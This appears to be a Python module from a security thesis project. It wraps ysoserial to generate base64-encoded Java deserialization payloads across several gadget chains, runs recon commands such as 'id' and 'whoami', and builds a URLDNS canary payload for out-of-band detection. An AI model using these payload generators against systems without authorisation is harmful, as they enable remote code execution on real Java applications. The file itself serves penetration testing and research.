import subprocess
import base64
import os


class PayloadMutation:

    YSOSERIAL_PATH = "D:\\Thesis\\Analyze\\third_tool\\ysoserial-all.jar"

    TEST_COMMANDS = ["id", "whoami", "hostname"]

    JAVA_CHAIN_MAP = {
        "CommonsCollections": [
            "CommonsCollections6",
            "CommonsCollections1",
            "CommonsCollections4",
        ],
        "TemplatesImpl": [
            "Jdk7u21",
            "CommonsCollections4",
        ],
        "Spring": [
            "Spring1",
            "Spring2",
        ],
        "Groovy": [
            "Groovy1",
        ],
        "JNDI": [
            "CommonsCollections6",
            "Spring1",
        ],
    }

    def __init__(self, exploit_result: dict, vector: dict) -> None:
        self.exploit = exploit_result
        self.vector  = vector
        self.probe   = exploit_result.get("suggested_probe", "")
        self.etype   = exploit_result.get("exploit_type", "")

    def mutate(self) -> list[dict]:
        if self.probe == "ysoserial":
            return self._mutate_java()
        if self.probe == "urldns_probe":
            return self._mutate_java_urldns()
        return []


    def _resolve_chains(self) -> list[str]:
        for key, chains in self.JAVA_CHAIN_MAP.items():
            if key.lower() in self.etype.lower():
                return chains
        return ["CommonsCollections6", "CommonsCollections1", "Spring1"]

    def _get_java_flags(self) -> list[str]:
        try:
            result = subprocess.run(
                ["java", "-version"],
                capture_output=True,
                text=True
            )
            output = result.stderr + result.stdout
            if '"1.' in output:
                return []   
            return [
                "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
                "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
                "--add-opens=java.base/java.net=ALL-UNNAMED",
                "--add-opens=java.base/java.util=ALL-UNNAMED",
                "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
            ]
        except Exception:
            return []

    def _run_ysoserial(self, chain: str, command: str) -> str | None:
        if not os.path.exists(self.YSOSERIAL_PATH):
            return None
        try:
            flags = self._get_java_flags()
            cmd   = ["java"] + flags + ["-jar", self.YSOSERIAL_PATH, chain, command]

            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=15
            )

            if result.returncode == 0 and result.stdout:
                return base64.b64encode(result.stdout).decode()

            return None

        except subprocess.TimeoutExpired:
            print(f"[!] Timeout: {chain}")
            return None
        except FileNotFoundError:
            print("[!] java not found")
            return None

    def _make_payload(self, ptype, chain, command, b64) -> dict:
        return {
            "type":     ptype,
            "chain":    chain,
            "command":  command,
            "payload":  b64,
            "location": self.vector.get("location"),
            "name":     self.vector.get("name"),
            "url":      self.vector.get("url"),
        }


    def _mutate_java(self) -> list[dict]:
        results = []
        chains  = self._resolve_chains()

        if not os.path.exists(self.YSOSERIAL_PATH):
            return [{
                "error":   "ysoserial-all.jar not found",
                "hint":    f"Place ysoserial-all.jar at: {os.path.abspath(self.YSOSERIAL_PATH)}",
                "command": f"java -jar ysoserial-all.jar {chains[0]} 'id' > payload.ser"
            }]

        for chain in chains:
            for cmd in self.TEST_COMMANDS:
                print(f"[*] Trying {chain} → {cmd}")
                b64 = self._run_ysoserial(chain, cmd)
                if b64:
                    results.append(self._make_payload("java_deser", chain, cmd, b64))
                    print(f"[+] Generated: {chain}")
                else:
                    print(f"[-] Failed: {chain}")

        return results


    def _mutate_java_urldns(self) -> list[dict]:
        if not os.path.exists(self.YSOSERIAL_PATH):
            return [{
                "error": "ysoserial-all.jar not found",
                "hint":  "java -jar ysoserial-all.jar URLDNS 'http://YOUR_CANARY' | base64"
            }]

        canary = "http://canary.REPLACE_WITH_YOUR_INTERACTSH_DOMAIN.com"
        b64    = self._run_ysoserial("URLDNS", canary)

        if b64:
            payload = self._make_payload("java_urldns", "URLDNS", canary, b64)
            payload["note"] = "Replace canary domain with your interactsh or burp collaborator URL"
            return [payload]

        return []